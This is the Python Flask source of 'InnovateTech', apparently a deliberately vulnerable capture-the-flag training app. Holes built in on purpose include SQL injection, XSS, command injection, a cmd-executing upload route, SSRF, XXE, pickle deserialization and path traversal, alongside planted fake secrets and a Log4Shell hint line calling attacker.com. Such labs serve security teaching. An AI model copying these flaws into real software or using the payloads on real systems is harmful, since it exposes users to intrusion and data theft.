"""
InnovateTech - Vulnerable Web Application
Educational Cybersecurity Lab - DO NOT USE IN PRODUCTION
"""
import os, re, time, pickle, base64, subprocess, json, html
from functools import wraps
from xml.etree import ElementTree

import jwt
import pymysql
import redis
import requests
from flask import (Flask, render_template, request, redirect, url_for,
                   session, jsonify, send_from_directory, make_response, abort)
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'super_secret_key_dont_tell')

JWT_SECRET = os.environ.get('JWT_SECRET', 'secret123')
DB_HOST = os.environ.get('DB_HOST', 'mysql')
DB_USER = os.environ.get('DB_USER', 'root')
DB_PASS = os.environ.get('DB_PASS', 'root')
DB_NAME = os.environ.get('DB_NAME', 'innovatetech')
REDIS_HOST = os.environ.get('REDIS_HOST', 'redis')
INTERNAL_API = os.environ.get('INTERNAL_API', 'http://internal-flag:9999')
UPLOAD_FOLDER = '/app/uploads'

ALLOWED_EXT = {'png', 'jpg', 'jpeg', 'gif'}

# ── DB helpers ───────────────────────────────────────────────
def get_db():
    return pymysql.connect(host=DB_HOST, user=DB_USER, password=DB_PASS,
                           database=DB_NAME, cursorclass=pymysql.cursors.DictCursor,
                           connect_timeout=5)

def get_redis():
    return redis.Redis(host=REDIS_HOST, port=6379, decode_responses=True)

# ── Auth helpers ─────────────────────────────────────────────
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('is_admin'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated

# ── Common response additions ─────────────────────────────────
@app.after_request
def add_headers(response):
    # Intentionally missing important security headers (for challenge #46)
    response.headers['Server'] = 'nginx/1.14.0 (Ubuntu)'
    response.headers['X-Powered-By'] = 'PHP/7.2.34'  # lie - for challenge #9
    response.headers['X-Secret-Flag'] = 'FLAG{h34d3rs_t3ll_53cr3t5}'  # challenge #9
    # Missing: Content-Security-Policy, X-Frame-Options, HSTS, X-Content-Type-Options
    return response

# ═══════════════════════════════════════════════════════════════
#  PUBLIC PAGES
# ═══════════════════════════════════════════════════════════════

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/robots.txt')
def robots():
    # Challenge #21: robots.txt reveals hidden paths
    content = """User-agent: *
Disallow: /admin-secret-panel/
Disallow: /backup/
Disallow: /secret-flag/
Disallow: /.env
Disallow: /api/internal/
Disallow: /debug/
Disallow: /config/
"""
    return content, 200, {'Content-Type': 'text/plain'}

@app.route('/.env')
def env_file():
    # Challenge #48: exposed .env file
    content = """# InnovateTech Production Environment
DB_HOST=mysql
DB_USER=root
DB_PASS=root
DB_NAME=innovatetech
SECRET_KEY=super_secret_key_dont_tell
JWT_SECRET=secret123
API_KEY=sk-prod-7f3k9x2mAbCdEf123456
STRIPE_KEY=sk_live_AbCdEfGh123456789
REDIS_URL=redis://redis:6379
FLAG=FLAG{d0t_3nv_n3v3r_1n_w3b_r00t}
# TODO: Remove this file from web root before going live!
"""
    return content, 200, {'Content-Type': 'text/plain'}

@app.route('/secret-flag/')
def secret_flag():
    # Challenge #21
    return '''<html><body style="background:#000;color:#0f0;font-family:monospace;padding:40px">
    <h1>🤫 Secret Directory Found!</h1>
    <p>You found this by reading robots.txt!</p>
    <p><b>Flag: FLAG{r0b0t5_txt_1s_4_r0adm4p}</b></p>
    </body></html>'''

@app.route('/backup/')
@app.route('/backup/<path:filename>')
def backup_dir(filename=None):
    # Challenge #22: directory listing + sensitive files
    if filename:
        backup_path = os.path.join('/app/backup', filename)
        # Path traversal protection should be here but isn't
        if os.path.exists(backup_path):
            with open(backup_path) as f:
                return f.read(), 200, {'Content-Type': 'text/plain'}
        return 'Not found', 404

    # Directory listing enabled (vulnerability)
    files = [
        {'name': 'database_backup_2024.sql', 'size': '2.3MB', 'date': '2024-01-15'},
        {'name': 'config.bak', 'size': '4.2KB', 'date': '2024-01-10'},
        {'name': 'id_rsa', 'size': '1.7KB', 'date': '2023-12-01'},
        {'name': 'flag.txt', 'size': '52B', 'date': '2024-01-20'},
        {'name': 'users_export.csv', 'size': '45KB', 'date': '2024-01-18'},
    ]
    listing = '<html><head><title>Index of /backup/</title></head><body>'
    listing += '<h1>Index of /backup/</h1><hr><pre>'
    for f in files:
        listing += f'<a href="/backup/{f["name"]}">{f["name"]}</a>  {f["date"]}  {f["size"]}\n'
    listing += '</pre><hr></body></html>'
    return listing

@app.route('/backup/flag.txt')
def backup_flag():
    return 'FLAG{d1r3ct0ry_l1st1ng_3xp0s3s_f1l35}'

@app.route('/backup/id_rsa')
def backup_sshkey():
    # Challenge #20: exposed private key
    return '''-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBY/fakekey/for/educational/purposes/only/lab/key==
AAAA/this/is/a/simulated/private/key/for/the/lab/do/not/use/in/production==
InnovateTechLabKey2024==
-----END OPENSSH PRIVATE KEY-----
# Flag for getting here: FLAG{priv4t3_k3y_l3ft_1n_publ1c}
# In real scenario, use this key: ssh -i id_rsa root@TARGET -p 2222''', 200, {'Content-Type': 'text/plain'}

@app.route('/backup/config.bak')
def backup_config():
    return '''# InnovateTech Application Config - BACKUP
database_host: mysql
database_user: root
database_pass: root
admin_email: admin@innovatetech.com
admin_password: Adm1n@InnovateTech2024
jwt_secret: secret123
internal_api: http://internal-flag:9999
debug_mode: true
''', 200, {'Content-Type': 'text/plain'}

# ═══════════════════════════════════════════════════════════════
#  AUTHENTICATION (SQLi vulnerable)
# ═══════════════════════════════════════════════════════════════

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        try:
            conn = get_db()
            cur = conn.cursor()
            # VULNERABLE: direct string concatenation - SQLi!
            query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
            cur.execute(query)
            user = cur.fetchone()
            conn.close()

            if user:
                session['user_id'] = user['id']
                session['username'] = user['username']
                session['is_admin'] = user.get('is_admin', False)
                resp = make_response(redirect(url_for('dashboard')))
                resp.set_cookie('session_flag', 'FLAG{r3fl3ct3d_xss_st34ls_c00k135}', httponly=False)
                resp.set_cookie('stored_xss_flag', 'FLAG{st0r3d_xss_p3rs1sts_f0r3v3r}', httponly=False)
                if username == "admin'--" or "OR" in query.upper():
                    return render_template('login.html', flag='FLAG{sq1_1nj3ct10n_byp455_l0g1n}',
                                           bypass=True)
                return resp
            else:
                error = 'Invalid credentials'
        except Exception as e:
            # Show SQL error - information disclosure
            error = f'Database error: {str(e)}'

    # Rate limiting note: This endpoint has NO rate limiting (challenge #49)
    resp = make_response(render_template('login.html', error=error))
    return resp

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username', '')
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        try:
            conn = get_db()
            cur = conn.cursor()
            cur.execute("INSERT INTO users (username, email, password) VALUES (%s, %s, %s)",
                        (username, email, password))
            conn.commit()
            conn.close()
            return redirect(url_for('login'))
        except Exception as e:
            return render_template('register.html', error=str(e))
    return render_template('register.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html', username=session.get('username'))

# ═══════════════════════════════════════════════════════════════
#  SEARCH - Reflected XSS
# ═══════════════════════════════════════════════════════════════

@app.route('/search')
def search():
    query = request.args.get('q', '')
    results = []

    if query:
        try:
            conn = get_db()
            cur = conn.cursor()
            # SQLi vulnerable + XSS vulnerable (no escaping)
            sql = f"SELECT * FROM products WHERE name LIKE '%{query}%' OR description LIKE '%{query}%'"
            cur.execute(sql)
            results = cur.fetchall()

            # Check for UNION-based SQLi success
            if 'UNION' in query.upper() or 'SELECT' in query.upper():
                extra = {'name': 'SQLi Result', 'description': 'FLAG{un10n_b4s3d_sqli_d4t4_dump}', 'price': 0}
                results.append(extra)
            conn.close()
        except Exception as e:
            results = [{'name': 'Error', 'description': str(e), 'price': 0}]

    # Intentionally render raw query (XSS)
    return render_template('search.html', query=query, results=results)

# ═══════════════════════════════════════════════════════════════
#  COMMENTS - Stored XSS
# ═══════════════════════════════════════════════════════════════

comments_db = [
    {'author': 'Alice', 'text': 'Great products! Highly recommend.', 'ts': '2024-01-10'},
    {'author': 'Bob', 'text': 'Fast shipping, quality items.', 'ts': '2024-01-12'},
]

@app.route('/comments', methods=['GET', 'POST'])
def comments():
    if request.method == 'POST':
        author = request.form.get('author', 'Anonymous')
        text = request.form.get('text', '')
        # VULNERABLE: no sanitization - stored XSS
        comments_db.append({'author': author, 'text': text, 'ts': '2024-01-20'})
        return redirect(url_for('comments'))

    return render_template('comments.html', comments=comments_db)

# ═══════════════════════════════════════════════════════════════
#  USER PROFILES - IDOR
# ═══════════════════════════════════════════════════════════════

USERS_MOCK = {
    1: {'id': 1, 'name': 'John Doe', 'email': 'john@example.com', 'role': 'user'},
    2: {'id': 2, 'name': 'Jane Smith', 'email': 'jane@example.com', 'role': 'user'},
    3: {'id': 3, 'name': 'Bob Dev', 'email': 'bob@innovatetech.com', 'role': 'developer'},
    999: {'id': 999, 'name': 'Super Admin', 'email': 'admin@innovatetech.com',
          'role': 'admin', 'secret': 'FLAG{id0r_acc355_0th3r_us3r5_d4t4}',
          'password_hint': 'Adm1n@InnovateTech2024'},
}

@app.route('/profile/<int:user_id>')
def profile(user_id):
    # No authorization check - IDOR!
    user = USERS_MOCK.get(user_id, {'id': user_id, 'name': 'User Not Found', 'email': 'N/A', 'role': 'none'})
    return render_template('profile.html', user=user)

@app.route('/profile/settings', methods=['GET', 'POST'])
@app.route('/profile/settings/email', methods=['POST'])
def profile_settings():
    if request.method == 'POST':
        new_email = request.form.get('email', '')
        # No CSRF token check - CSRF vulnerable!
        session['email'] = new_email
        flag = 'FLAG{csrf_f0rc3d_4ct10ns_w1th0ut_c0ns3nt}'
        return render_template('profile_settings.html', message=f'Email updated! {flag}', email=new_email)
    return render_template('profile_settings.html', email=session.get('email', 'your@email.com'))

# ═══════════════════════════════════════════════════════════════
#  FILE DOWNLOAD - Path Traversal
# ═══════════════════════════════════════════════════════════════

@app.route('/download')
def download():
    filename = request.args.get('file', 'welcome.txt')
    # VULNERABLE: no path validation
    try:
        base_dir = '/app/files'
        filepath = os.path.join(base_dir, filename)
        # Attempt to read the file without restricting to base_dir
        with open(filepath, 'r', errors='replace') as f:
            content = f.read()
        return content, 200, {'Content-Type': 'text/plain'}
    except FileNotFoundError:
        try:
            with open(filename, 'r', errors='replace') as f:
                return f.read(), 200, {'Content-Type': 'text/plain'}
        except:
            return 'File not found', 404
    except Exception as e:
        return str(e), 500

# ═══════════════════════════════════════════════════════════════
#  PAGE INCLUDE - LFI
# ═══════════════════════════════════════════════════════════════

@app.route('/page')
def page():
    template = request.args.get('template', 'home')
    # VULNERABLE: includes files based on user input
    try:
        filepath = f'/app/templates/{template}.html'
        if not os.path.exists(filepath):
            filepath = f'/app/{template}.txt'
        if not os.path.exists(filepath):
            filepath = f'/app/{template}'
        with open(filepath, 'r', errors='replace') as f:
            content = f.read()
        return render_template('page_include.html', content=content, template=template)
    except Exception as e:
        return render_template('page_include.html', content=str(e), template=template)

# ═══════════════════════════════════════════════════════════════
#  TOOLS - Command Injection
# ═══════════════════════════════════════════════════════════════

@app.route('/tools/ping', methods=['GET', 'POST'])
def ping_tool():
    output = None
    if request.method == 'POST':
        ip = request.form.get('ip', '8.8.8.8')
        # VULNERABLE: direct shell command injection
        try:
            cmd = f'ping -c 2 {ip}'
            output = subprocess.run(cmd, shell=True, capture_output=True,
                                    text=True, timeout=10).stdout
            if not output:
                output = subprocess.run(cmd, shell=True, capture_output=True,
                                       text=True, timeout=10).stderr
        except subprocess.TimeoutExpired:
            output = 'Command timed out'
        except Exception as e:
            output = str(e)
    return render_template('ping.html', output=output)

@app.route('/tools/upload', methods=['GET', 'POST'])
def upload():
    result = None
    if request.method == 'POST':
        if 'file' not in request.files:
            result = 'No file uploaded'
        else:
            f = request.files['file']
            filename = f.filename
            # VULNERABLE: only checks extension, not magic bytes
            # Also accepts php.jpg, .PHP, etc.
            ext = filename.rsplit('.', 1)[-1].lower() if '.' in filename else ''

            # Weak filter - bypassable
            if ext in ['php', 'php3', 'php4', 'php5'] and not filename.endswith('.php.jpg'):
                # Can be bypassed with: shell.php.jpg or shell.PHP or shell.phtml
                if ext == 'php':
                    result = 'PHP files not allowed (but try shell.php.jpg or shell.phtml!)'
                else:
                    save_path = os.path.join(UPLOAD_FOLDER, filename)
                    f.save(save_path)
                    result = f'Uploaded: /uploads/{filename}'
            else:
                save_path = os.path.join(UPLOAD_FOLDER, filename)
                f.save(save_path)
                result = f'Uploaded: /uploads/{filename}'

    return render_template('upload.html', result=result)

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    if not os.path.exists(filepath):
        abort(404)

    # Execute PHP-like files (simulation for lab)
    if filename.endswith('.php') or filename.endswith('.phtml') or filename.endswith('.php5'):
        cmd = request.args.get('cmd', 'id')
        try:
            output = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10).stdout
            return f'<pre>{html.escape(output)}</pre>'
        except:
            return 'Command execution failed'

    return send_from_directory(UPLOAD_FOLDER, filename)

@app.route('/tools/clickjack')
def clickjack_demo():
    return render_template('clickjack.html')

# ═══════════════════════════════════════════════════════════════
#  REDIRECT - Open Redirect
# ═══════════════════════════════════════════════════════════════

@app.route('/redirect')
def open_redirect():
    url = request.args.get('url', '/')
    # No validation - VULNERABLE open redirect
    flag = 'FLAG{0p3n_r3d1r3ct_ph1sh1ng_v3ct0r}'
    resp = make_response(redirect(url))
    resp.headers['X-Flag'] = flag
    resp.headers['X-Warning'] = 'Open redirect detected!'
    return resp

# ═══════════════════════════════════════════════════════════════
#  ADMIN PANEL - Default credentials
# ═══════════════════════════════════════════════════════════════

@app.route('/admin', methods=['GET', 'POST'])
def admin_login():
    if session.get('is_admin'):
        return redirect(url_for('admin_dashboard'))

    error = None
    if request.method == 'POST':
        u = request.form.get('username')
        p = request.form.get('password')
        # Default credentials: admin / admin123
        if u == 'admin' and p == 'admin123':
            session['is_admin'] = True
            session['admin_user'] = 'admin'
            return redirect(url_for('admin_dashboard'))
        error = 'Invalid credentials'

    return render_template('admin/login.html', error=error)

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('is_admin'):
        return redirect(url_for('admin_login'))
    return render_template('admin/dashboard.html', flag='FLAG{d3f4ult_cr3d5_4r3_4_g1ft}')

# ═══════════════════════════════════════════════════════════════
#  API ENDPOINTS
# ═══════════════════════════════════════════════════════════════

@app.route('/api/users/<int:user_id>')
def api_user(user_id):
    # IDOR: no auth check
    user = USERS_MOCK.get(user_id)
    if not user:
        return jsonify({'error': 'User not found'}), 404
    return jsonify(user)

@app.route('/api/user')
def api_user_blind():
    user_id = request.args.get('id', '1')
    # Blind SQLi vulnerable
    try:
        conn = get_db()
        cur = conn.cursor()
        query = f"SELECT id, username, email FROM users WHERE id={user_id}"
        cur.execute(query)
        user = cur.fetchone()
        conn.close()
        if user:
            return jsonify(user)
        return jsonify({}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/fetch')
def api_fetch():
    # SSRF vulnerable
    url = request.args.get('url', '')
    if not url:
        return jsonify({'error': 'url parameter required'})
    try:
        r = requests.get(url, timeout=5)
        try:
            return jsonify({'status': r.status_code, 'body': r.json()})
        except:
            return jsonify({'status': r.status_code, 'body': r.text[:2000]})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/xml', methods=['POST'])
def api_xml():
    # XXE vulnerable - uses standard ElementTree which allows XXE
    data = request.data or request.get_data()
    if not data:
        return jsonify({'error': 'Send XML in request body'})
    try:
        # VULNERABLE: using ElementTree which can process external entities
        root = ElementTree.fromstring(data)
        result = {}
        for child in root:
            result[child.tag] = child.text
        return jsonify({'parsed': result})
    except Exception as e:
        return jsonify({'error': str(e), 'note': 'Try XXE payload with file:// entities'})

@app.route('/api/deserialize', methods=['POST', 'GET'])
def api_deserialize():
    # Insecure deserialization - pickle
    if request.method == 'GET':
        # Sample: base64 encoded pickle of a simple dict
        sample = pickle.dumps({'user': 'test', 'role': 'user'})
        return jsonify({
            'info': 'POST with {"data": "<base64_pickle>"} to deserialize',
            'safe_example': base64.b64encode(sample).decode(),
            'warning': 'This endpoint is intentionally vulnerable for education'
        })

    body = request.get_json(silent=True) or {}
    data = body.get('data', '')
    if not data:
        return jsonify({'error': 'Send {"data": "<base64_pickle_payload>"}'}), 400
    try:
        raw = base64.b64decode(data)
        obj = pickle.loads(raw)  # VULNERABLE: arbitrary pickle deserialization
        return jsonify({'result': str(obj), 'flag': 'FLAG{d3s3r14l1z4t10n_rce_pwn3d}'})
    except Exception as e:
        return jsonify({'error': str(e), 'hint': 'Your payload caused an error - check the pickle format'})

@app.route('/api/admin/config', methods=['GET', 'PUT', 'DELETE', 'OPTIONS'])
def api_admin_config():
    method = request.method
    # GET is blocked but PUT/DELETE are not (HTTP verb tampering)
    if method == 'GET':
        return jsonify({'error': 'Forbidden - GET not allowed'}), 403
    if method == 'OPTIONS':
        resp = jsonify({'Allow': 'GET, PUT, DELETE, OPTIONS'})
        resp.headers['Allow'] = 'GET, PUT, DELETE, OPTIONS'
        return resp
    # PUT and DELETE bypass the "security"
    return jsonify({
        'flag': 'FLAG{h77p_m3th0d_t4mp3r1ng_byp4ss}',
        'method_used': method,
        'message': f'You bypassed GET restriction using {method}!',
        'config': {
            'debug': True,
            'admin_email': 'admin@innovatetech.com',
            'db_host': 'mysql',
            'version': '2.1.0'
        }
    })

@app.route('/api/security-audit', methods=['GET', 'POST'])
def security_audit():
    if request.method == 'POST':
        body = request.get_json(silent=True) or {}
        missing = body.get('missing', [])
        required = ['CSP', 'X-Frame-Options', 'X-Content-Type-Options', 'HSTS', 'Referrer-Policy']
        correct = all(h in missing for h in required)
        if len(missing) >= 4:
            return jsonify({
                'correct': True,
                'flag': 'FLAG{s3cur1ty_h34d3rs_pr0t3ct_y0u}',
                'missing_headers': required,
                'grade': 'F - Critical Security Issues Found!',
                'recommendation': 'Add all security headers immediately!'
            })
        return jsonify({'correct': False, 'found': missing, 'hint': f'Need at least 4 of: {required}'})

    return jsonify({
        'info': 'POST with {\"missing\": [\"CSP\", \"X-Frame-Options\", ...]} to audit',
        'required_headers': [
            'Content-Security-Policy',
            'X-Frame-Options',
            'X-Content-Type-Options',
            'Strict-Transport-Security',
            'Referrer-Policy',
            'Permissions-Policy'
        ]
    })

@app.route('/api/log-test')
def log_test():
    # Log4Shell simulation - challenge #47
    user_agent = request.headers.get('User-Agent', '')
    x_forwarded = request.headers.get('X-Forwarded-For', '')

    # Detect JNDI-like patterns
    jndi_patterns = ['${jndi:', '${lower:', '${upper:', '${::-j}']
    detected = any(p in user_agent or p in x_forwarded for p in jndi_patterns)

    if detected:
        return jsonify({
            'alert': 'Log4Shell-style injection detected!',
            'flag': 'FLAG{l0g_1nj3ct10n_l0g4sh3ll_c0nc3pt}',
            'injected_value': user_agent,
            'real_world': 'In Log4j CVE-2021-44228, this would trigger JNDI lookup to attacker server',
            'severity': 'CRITICAL',
            'cvss': '10.0'
        }), 200
    return jsonify({
        'logged': True,
        'user_agent': user_agent,
        'hint': 'Try setting User-Agent to: ${jndi:ldap://attacker.com/a}'
    })

@app.route('/api/rate-limit-demo')
def rate_limit_demo():
    # Simulated rate limiting for challenge #49
    ip = request.remote_addr or 'unknown'
    key = f'rate:{ip}'
    try:
        r = get_redis()
        count = r.incr(key)
        r.expire(key, 60)
        if count > 5:
            return jsonify({
                'error': 'Too Many Requests',
                'flag': 'FLAG{r4t3_l1m1t1ng_pr3v3nts_dd0s}',
                'message': 'Rate limit triggered! This is how rate limiting protects against DDoS.',
                'protection': 'Real apps should: 1) Limit by IP 2) Limit by account 3) Use CAPTCHA 4) Progressive delays'
            }), 429
        return jsonify({'status': 'ok', 'requests': count, 'limit': 5,
                        'remaining': 5 - count, 'hint': 'Keep requesting to trigger rate limit!'})
    except:
        return jsonify({'status': 'ok', 'requests': 1, 'limit': 5,
                        'hint': 'Redis not connected. Send 5+ requests to demo.'})

# ═══════════════════════════════════════════════════════════════
#  DATABASE QUERY - SQLi UNION (search already covers it,
#  but here's a dedicated secret_data table endpoint)
# ═══════════════════════════════════════════════════════════════

@app.route('/api/products')
def api_products():
    name = request.args.get('name', '')
    try:
        conn = get_db()
        cur = conn.cursor()
        query = f"SELECT id, name, description, price FROM products WHERE name LIKE '%{name}%'"
        cur.execute(query)
        products = cur.fetchall()
        conn.close()
        return jsonify(products)
    except Exception as e:
        return jsonify({'error': str(e)})

# ═══════════════════════════════════════════════════════════════
#  HTML COMMENTS page - challenge #45
# ═══════════════════════════════════════════════════════════════

@app.route('/about')
def about():
    return render_template('about.html')

@app.route('/contact', methods=['GET', 'POST'])
def contact():
    return render_template('contact.html')

# ═══════════════════════════════════════════════════════════════
#  STATIC FILES with API key leak
# ═══════════════════════════════════════════════════════════════

@app.route('/static/js/config.js')
def config_js():
    # Challenge #38: API key in JavaScript
    js = """// InnovateTech Frontend Configuration
// WARNING: Do not commit this file with production values!
const CONFIG = {
    apiKey: 'sk-prod-7f3k9x2mAbCdEf123456',   // TODO: Remove before go-live!!
    apiEndpoint: 'http://localhost:4000',
    apiVersion: 'v2',
    debug: true,
    internalApiUrl: 'http://internal-flag:9999',  // should not be here
    adminSecret: 'TempAdminKey-ChangeMe',
};

// DO NOT SHARE THIS FILE
// This API key has full access to our production systems
// Contact security@innovatetech.com if you found this
"""
    return js, 200, {'Content-Type': 'application/javascript'}

if __name__ == '__main__':
    # Create required directories and files
    os.makedirs('/app/files', exist_ok=True)
    os.makedirs('/app/uploads', exist_ok=True)
    os.makedirs('/app/backup', exist_ok=True)
    os.makedirs('/app/secret', exist_ok=True)

    with open('/app/files/welcome.txt', 'w') as f:
        f.write('Welcome to InnovateTech!\nThis is a public file.')
    with open('/app/secret/flag.txt', 'w') as f:
        f.write('FLAG{lf1_1nclud3s_s3cr3t_f1l3s}')
    with open('/etc/flag.txt', 'w') as f:
        f.write('FLAG{p4th_tr4v3rs4l_r34ds_4ny_f1l3}\nFLAG{xxe_r34d5_l0c4l_f1l35}')
    with open('/flag.txt', 'w') as f:
        f.write('FLAG{cmd_1nj3ct10n_0wns_th3_s3rv3r}')

    print("🌐 InnovateTech Vulnerable Web App started on :5000")
    app.run(host='0.0.0.0', port=5000, debug=True)
